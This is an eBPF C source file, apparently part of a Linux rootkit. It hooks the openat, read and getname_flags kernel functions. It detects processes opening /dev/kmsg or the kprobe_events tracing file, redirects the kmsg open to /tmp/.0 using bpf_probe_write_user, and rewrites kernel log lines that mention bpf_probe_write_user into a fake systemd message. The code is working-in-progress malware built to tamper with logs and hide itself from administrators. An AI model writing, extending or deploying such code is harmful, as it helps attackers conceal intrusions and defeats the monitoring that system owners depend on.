#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

/*
    - we should use the dentry resolver to avoid bypass
    - handle do_syslog
*/

#define KMSG_HASH            0x9bc136aa6164a458 // /dev/kmsg
#define KPROBE_EVENTS_HASH   0x3d0ad1bf9950e4d4 // /sys/kernel/debug/tracing/kprobe_events

enum {
    KMSG = 1,
    KPROBE_EVENTS
};

struct bpf_map_def SEC("maps/read_ret_progs") read_ret_progs = {
    .type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 10,
};

struct oukilay_t {
    int file;
    int fd;
    void *buf;
};

struct bpf_map_def SEC("maps/oukilay") oukilay = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct oukilay_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

// Fowler/Noll/Vo hash
#define FNV_BASIS ((__u64)14695981039346656037U)
#define FNV_PRIME ((__u64)1099511628211U)

#define __update_hash(key, data) \
    *key ^= (__u64)(data); \
    *key *= FNV_PRIME;

void __attribute__((always_inline)) update_hash_byte(__u64 *key, __u8 byte) {
    __update_hash(key, byte);
}

SEC("kprobe/__x64_sys_openat")
int __x64_sys_openat(struct pt_regs *ctx)
{    
    ctx = (struct pt_regs *) PT_REGS_PARM1(ctx);

    const char *filename = NULL;
    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM2(ctx));

    char name[64];
    bpf_probe_read(name, sizeof(name), (void *)filename);

    u64 hash = FNV_BASIS;

    #pragma unroll
    for (int i = 0; i != 64; i++) {
        if (name[i] == '\0') {
            break;
        }
        update_hash_byte(&hash, name[i]);
    }
    
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t value = {};

    // /dev/kmsg
    if (hash == KMSG_HASH) {
        value.file = KMSG;
        bpf_map_update_elem(&oukilay, &key, &value, BPF_ANY);
    } else if (hash == KPROBE_EVENTS_HASH) {
        value.file = KPROBE_EVENTS;
        bpf_map_update_elem(&oukilay, &key, &value, BPF_ANY);
    }

    return 0;
};

SEC("kretprobe/__x64_sys_openat")
int __x64_sys_openat_ret(struct pt_regs *ctx)
{    
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    unsigned long fd = (int) PT_REGS_RC(ctx);

    unsigned long kmsg_fd;
    LOAD_CONSTANT("kmsg_fd", kmsg_fd);

  /*  if (value->file == 1) {
        fd = kmsg_fd;
        bpf_override_return(ctx, fd);
    }*/
    
    value->fd = fd;
    bpf_printk("return: %d\n", fd);
    return 0;
}

SEC("kprobe/getname_flags")
int kprobe_getname_flags(struct pt_regs *ctx) {
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    bpf_printk("filp_open: %d\n", value->file);

    if (value->file != KMSG) {
        return 0;
    }

    void *filename = (void *) PT_REGS_PARM1(ctx);

    char name[64];
    bpf_probe_read(name, sizeof(name), (void *)filename);

    const char buf[] = "/tmp/.0";
    int ret = bpf_probe_write_user(filename, buf, sizeof(buf));

    bpf_probe_read(name, sizeof(name), (void *)filename);

    bpf_printk(">>>>>>>>: %s: %d\n", name, ret);

    return 0;
}

SEC("kprobe/__x64_sys_read")
int kprobe_sys_read(struct pt_regs *ctx) {
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    ctx = (struct pt_regs *) PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));

    if (value->fd == fd) {
        void *buf = NULL;
        bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(ctx));

        value->buf = buf;
    }

    return 0;
}

SEC("kprobe/kmsg")
int kmsg(struct pt_regs *ctx) {
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    if (!value->buf) {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), value->buf);

    u8 o1 = 0;
    u64 hash = 0;

    #pragma unroll
    for (int i = 0; i != 128; i++) {
        if (buf[i] == ';' && !o1) {
            o1 = i + 1;
        } else if (buf[i] == ' ') {
            hash = FNV_BASIS;
        }
        update_hash_byte(&hash, buf[i]);

        // ` bpf_probe_write_user` hash
        if (hash == 0x466f6ecd5bee2aca) {
            break;
        }
    }

    if (hash == 0x466f6ecd5bee2aca) {
        const char override[] = "systemd[1]: Reached target Sockets.";
        bpf_probe_write_user(value->buf + o1, override, sizeof(override));
    }

    return 0;
}

SEC("kprobe/kprobe_events")
int kprobe_events(struct pt_regs *ctx) {
    int retval = PT_REGS_RC(ctx);
    if (!retval) {
        return 0;
    }

    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    if (!value->buf) {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), value->buf);

    return 0;
}

SEC("kretprobe/__x64_sys_read")
int __x64_sys_read_ret(struct pt_regs *ctx) {
    u64 key = bpf_get_current_pid_tgid();
    struct oukilay_t *value = (struct oukilay_t *) bpf_map_lookup_elem(&oukilay, &key);
    if (!value) {
        return 0;
    }

    bpf_tail_call(ctx, &read_ret_progs, value->file);

    return 0;
}

char _license[] SEC("license") = "GPL";
__u32 _version SEC("version") = 0xFFFFFFFE;
